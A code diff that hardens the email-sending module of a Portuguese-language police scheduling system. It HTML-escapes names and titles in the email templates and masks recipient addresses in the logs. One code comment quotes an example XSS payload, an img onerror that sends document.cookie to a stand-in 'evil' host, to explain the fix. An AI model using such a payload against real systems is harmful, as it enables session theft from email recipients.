@@ -14,6 +14,24 @@
 import nodemailer, { type Transporter } from 'nodemailer';
 import { montarHtmlEmailNotificacaoAssessorGise } from './gise-assessor-notificacao-text';
 import { logger } from './logger';
+import { mascararEmail } from './auth-flow';
+
+/**
+ * Escapa caracteres HTML perigosos para interpolação segura nos templates
+ * de e-mail. Sem isto, um admin que cadastrasse um policial com
+ * `nome = "<img src=x onerror=fetch('//evil/?c='+document.cookie)>"`
+ * conseguia injetar HTML/JS no e-mail entregue ao destinatário — webmails
+ * modernos isolam JS, mas atributos como `onerror`, `style` com URL e
+ * tags `<img>` apontando para tracking ainda passam em muitos clients.
+ */
+function escapeHtml(value: string): string {
+  return value
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#x27;');
+}
 
 function getCredenciais(platform: App.Platform | undefined): { user: string; pass: string } {
   const e = platform?.env as Env | undefined;
@@ -80,7 +98,7 @@ export async function enviarSenhaProvisoria(
         </tr>
         <tr>
           <td style="padding:32px;">
-            <p style="margin:0 0 8px;color:#333;font-size:15px;">Olá, <strong>${nomeUsuario}</strong>!</p>
+            <p style="margin:0 0 8px;color:#333;font-size:15px;">Olá, <strong>${escapeHtml(nomeUsuario)}</strong>!</p>
             <p style="margin:0 0 24px;color:#555;font-size:14px;">
               Sua senha provisória de acesso ao sistema foi gerada. Use-a para fazer login e, em seguida, você será solicitado a definir uma nova senha.
             </p>
@@ -139,7 +157,7 @@ export async function enviarCodigo2FA(
         </tr>
         <tr>
           <td style="padding:32px;">
-            <p style="margin:0 0 8px;color:#333;font-size:15px;">Olá, <strong>${nomeUsuario}</strong>!</p>
+            <p style="margin:0 0 8px;color:#333;font-size:15px;">Olá, <strong>${escapeHtml(nomeUsuario)}</strong>!</p>
             <p style="margin:0 0 24px;color:#555;font-size:14px;">
               Seu código de verificação para acesso ao sistema é:
             </p>
@@ -166,12 +184,12 @@ export async function enviarCodigo2FA(
 </html>`
     });
     logger.info('[email/2fa] Código enviado', {
-      destinatario,
+      destinatario: mascararEmail(destinatario),
       messageId: info.messageId
     });
   } catch (err) {
     logger.error('[email/2fa] Erro ao enviar', {
-      destinatario,
+      destinatario: mascararEmail(destinatario),
       error: err instanceof Error ? err.message : String(err)
     });
     throw err;
@@ -208,7 +226,7 @@ export async function enviarCodigoEmailPessoal(
         </tr>
         <tr>
           <td style="padding:32px;">
-            <p style="margin:0 0 8px;color:#333;font-size:15px;">Olá, <strong>${nomeUsuario}</strong>!</p>
+            <p style="margin:0 0 8px;color:#333;font-size:15px;">Olá, <strong>${escapeHtml(nomeUsuario)}</strong>!</p>
             <p style="margin:0 0 24px;color:#555;font-size:14px;">
               Para confirmar seu e-mail pessoal no sistema como canal de recuperação de senha, use o código abaixo:
             </p>
@@ -236,12 +254,12 @@ export async function enviarCodigoEmailPessoal(
 </html>`
     });
     logger.info('[email/verificacao-pessoal] Código enviado', {
-      destinatario,
+      destinatario: mascararEmail(destinatario),
       messageId: info.messageId
     });
   } catch (err) {
     logger.error('[email/verificacao-pessoal] Erro ao enviar', {
-      destinatario,
+      destinatario: mascararEmail(destinatario),
       error: err instanceof Error ? err.message : String(err)
     });
     throw err;
@@ -278,7 +296,7 @@ export async function enviarCodigoRedefinicaoSenha(
         </tr>
         <tr>
           <td style="padding:32px;">
-            <p style="margin:0 0 8px;color:#333;font-size:15px;">Olá, <strong>${nomeUsuario}</strong>!</p>
+            <p style="margin:0 0 8px;color:#333;font-size:15px;">Olá, <strong>${escapeHtml(nomeUsuario)}</strong>!</p>
             <p style="margin:0 0 24px;color:#555;font-size:14px;">
               Use o código abaixo para autorizar o envio do link de redefinição de senha:
             </p>
@@ -306,12 +324,12 @@ export async function enviarCodigoRedefinicaoSenha(
 </html>`
     });
     logger.info('[email/redefinicao-codigo] Código enviado', {
-      destinatario,
+      destinatario: mascararEmail(destinatario),
       messageId: info.messageId
     });
   } catch (err) {
     logger.error('[email/redefinicao-codigo] Erro ao enviar', {
-      destinatario,
+      destinatario: mascararEmail(destinatario),
       error: err instanceof Error ? err.message : String(err)
     });
     throw err;
@@ -348,7 +366,7 @@ export async function enviarLinkRedefinicaoSenha(
         </tr>
         <tr>
           <td style="padding:32px;">
-            <p style="margin:0 0 8px;color:#333;font-size:15px;">Olá, <strong>${nomeUsuario}</strong>!</p>
+            <p style="margin:0 0 8px;color:#333;font-size:15px;">Olá, <strong>${escapeHtml(nomeUsuario)}</strong>!</p>
             <p style="margin:0 0 24px;color:#555;font-size:14px;">
               Recebemos uma solicitação de redefinição de senha para a sua conta no Sistema de Escalas de Plantão.
               Clique no botão abaixo para definir uma nova senha:
@@ -386,12 +404,12 @@ export async function enviarLinkRedefinicaoSenha(
 </html>`
     });
     logger.info('[email/redefinicao] Link enviado', {
-      destinatario,
+      destinatario: mascararEmail(destinatario),
       messageId: info.messageId
     });
   } catch (err) {
     logger.error('[email/redefinicao] Erro ao enviar', {
-      destinatario,
+      destinatario: mascararEmail(destinatario),
       error: err instanceof Error ? err.message : String(err)
     });
     throw err;
@@ -428,7 +446,7 @@ export async function enviarLinkPrimeiroAcesso(
         </tr>
         <tr>
           <td style="padding:32px;">
-            <p style="margin:0 0 8px;color:#333;font-size:15px;">Olá, <strong>${nomeUsuario}</strong>!</p>
+            <p style="margin:0 0 8px;color:#333;font-size:15px;">Olá, <strong>${escapeHtml(nomeUsuario)}</strong>!</p>
             <p style="margin:0 0 24px;color:#555;font-size:14px;">
               Sua conta no Sistema de Escalas de Plantão foi criada. Clique no botão abaixo para definir sua senha e ativar o acesso:
             </p>
@@ -465,12 +483,12 @@ export async function enviarLinkPrimeiroAcesso(
 </html>`
     });
     logger.info('[email/primeiro-acesso] Link enviado', {
-      destinatario,
+      destinatario: mascararEmail(destinatario),
       messageId: info.messageId
     });
   } catch (err) {
     logger.error('[email/primeiro-acesso] Erro ao enviar', {
-      destinatario,
+      destinatario: mascararEmail(destinatario),
       error: err instanceof Error ? err.message : String(err)
     });
     throw err;
@@ -517,10 +535,10 @@ export async function enviarEscalaFDSPorEmail(
               Segue em anexo a <strong>Escala de Plantão do Final de Semana</strong>:
             </p>
             <div style="background:#eef2ff;border-left:4px solid #1a3a6e;border-radius:6px;padding:16px 20px;margin-bottom:24px;">
-              <p style="margin:0;color:#1a3a6e;font-size:14px;font-weight:bold;">${tituloEscala}</p>
+              <p style="margin:0;color:#1a3a6e;font-size:14px;font-weight:bold;">${escapeHtml(tituloEscala)}</p>
             </div>
             <p style="margin:0 0 8px;color:#555;font-size:13px;">
-              Enviado por: <strong>${nomeRemetente}</strong>
+              Enviado por: <strong>${escapeHtml(nomeRemetente)}</strong>
             </p>
             <p style="margin:0;color:#888;font-size:12px;">
               O arquivo <em>.docx</em> está disponível em anexo.
@@ -546,13 +564,13 @@ export async function enviarEscalaFDSPorEmail(
       ]
     });
     logger.info('[email/fds] Escala enviada', {
-      destinatario,
+      destinatario: mascararEmail(destinatario),
       titulo: tituloEscala,
       messageId: info.messageId
     });
   } catch (err) {
     logger.error('[email/fds] Erro ao enviar', {
-      destinatario,
+      destinatario: mascararEmail(destinatario),
       error: err instanceof Error ? err.message : String(err)
     });
     throw err;
@@ -581,13 +599,13 @@ export async function enviarNotificacaoAssessorGisePreenchimentoSeccional(
       html
     });
     logger.info('[email/gise-assessor] Notificação enviada', {
-      destinatario,
+      destinatario: mascararEmail(destinatario),
       assessor: nomeAssessor,
       messageId: info.messageId
     });
   } catch (err) {
     logger.error('[email/gise-assessor] Erro ao enviar', {
-      destinatario,
+      destinatario: mascararEmail(destinatario),
       error: err instanceof Error ? err.message : String(err)
     });
     throw err;
